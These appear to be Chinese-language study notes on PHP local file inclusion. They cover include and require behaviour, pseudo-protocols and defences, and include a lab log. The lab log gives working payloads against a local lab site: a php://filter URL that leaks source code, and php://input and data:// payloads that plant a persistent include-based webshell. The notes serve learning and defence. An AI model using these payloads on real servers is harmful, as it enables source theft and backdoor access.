- 文件包含的产生原因：用户可控决定文件包含什么内容 (本质来讲就是：危险函数 + 用户可控危险函数参数)
- 文件包含与前几个漏洞的本质区别：文件包含更多作用是针对于服务器，而前几个漏洞针对于浏览器
- 文件包含的两个路径：信息泄露，代码执行

# 文件包含漏洞的函数：

## include函数本质：

- 处理流程：读取文件->交给php解释器->执行php代码->输出结果

  (在图片马中有涉及：对于图片文件来说，遇到图片内容之后直接输出普通文件，后续读取到php内容，再进行解释后输出)

- include不会根据文件后缀名进行不同的操作，而是直接读取文件，当遇到php部分时执行，其他类型文件就直接进行输出内容 (引出了后续图片马，以及日志污染攻击等内容)
- include使用相对路径进行查找文件，所以涉及到了目录穿越这种漏洞,但是结果是执行php文件，不能直接导致源码的泄露
- 文件包含失败后，程序会继续执行

## require函数：

- 在文件包含失败之后，程序终止

## include_once函数：

- 文件只执行一次

## require_once函数：

- 必须包含成功且执行一次

# 伪协议：

- 伪协议：php直接的虚拟接口，会影响include函数输出的结果，如：php://filter会导致源码的泄露

1. php://filter 读取文件内容
2. php://input 依赖于POST请求体，读取POST原始数据，也就是把POST内容当作文件执行
3. data:// 依赖于text/plain创建一个虚拟文件，把数据放入这个虚拟文件后，再交给include执行

- 以上协议最终都是交给include函数进行处理

# lab实验日志：

1. php://filter伪协议：通过访问http://web-master/vuln/include/lfi.php?file=php://filter/read=convert.base64-encode/resource=../../login.php拿到了login.php的base64编码，拿到了文件源码
2. php://input伪协议：通过bp抓包进行修改了POST主体内容，发现可以执行php代码，则会出现这种情况：攻击者生成一个动态lfi后门，代码如下：
   ```php
     通过访问http://web-master/vuln/include/lfi.php?file=php://input 后
     进行bp抓包，将主体内容改为：
     <?php file_put_contents("test.php",'<?php include($_GET["cmd"]);?>');?
   ```
   后续test.php文件存在一个include接口，对于input伪协议来说，危害点在于post主体内容可以存放php文件，当程序执行恶意php代码后，服务器会遭受攻击
3. data://伪协议：通过http://web-master/vuln/include/lfi.php?file=data://text/plain,<?php file_put_contents("test.php", '<?php include($_GET["cmd"]);?>');?>，在test文件里面同样达到了input伪协议的攻击效果

# 防御方式：

- 不能简单关闭伪协议的使用，同时要限制目录穿越以及伪协议的使用

1. 白名单操作：只允许用户进行访问某几个参数对应的文件，能够让用户无法自主控制include的参数 （见lfi.php）
2. 真实路径限制

# 其他问题：

在测试伪协议的时候，涉及到了伪协议不能使用的问题，后续通过修改文件php.ini中allow_url_include=On后，测试得以继续进行

---

**总结**

- 文件包含漏洞本质：攻击者能够控制文件包含函数的目标文件，使php解释器能够解析并执行攻击者指定文件中的php代码，从而导致任意文件读取或代码执行
- （lfi并不是一个单独的漏洞，在防御方面很好限制，lfi更多是作为一个攻击链内的某一个部分去进行一个攻击连的攻击）
- lfi的防御方法：限制include函数的参数，不要让用户控制文件包含的路径
- \*伪协议：不是与lfi同级的攻击漏洞，而是include函数读取的一种目标
